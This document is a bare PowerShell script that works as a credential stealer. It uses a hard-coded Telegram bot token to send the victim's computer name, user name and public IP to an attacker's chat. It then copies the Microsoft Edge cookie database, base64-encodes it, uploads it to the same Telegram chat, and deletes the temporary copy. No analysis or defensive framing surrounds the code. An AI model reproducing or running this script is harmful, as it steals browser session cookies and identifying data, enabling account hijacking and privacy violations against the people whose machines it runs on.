$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"

# Send PC info
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# Copy Edge cookies to temp
$src = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$dst = "$env:TEMP\Edge_Cookies.db"
Copy-Item $src $dst -Force -ErrorAction SilentlyContinue

# Send file using multipart/form-data (manual)
if (Test-Path $dst) {
    $bytes = [System.IO.File]::ReadAllBytes($dst)
    $b64 = [Convert]::ToBase64String($bytes)
    $payload = @{
        chat_id = $c
        document = $b64
    } | ConvertTo-Json
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendDocument" -Method Post -Body $payload -ContentType "application/json"
    Remove-Item $dst -Force
}
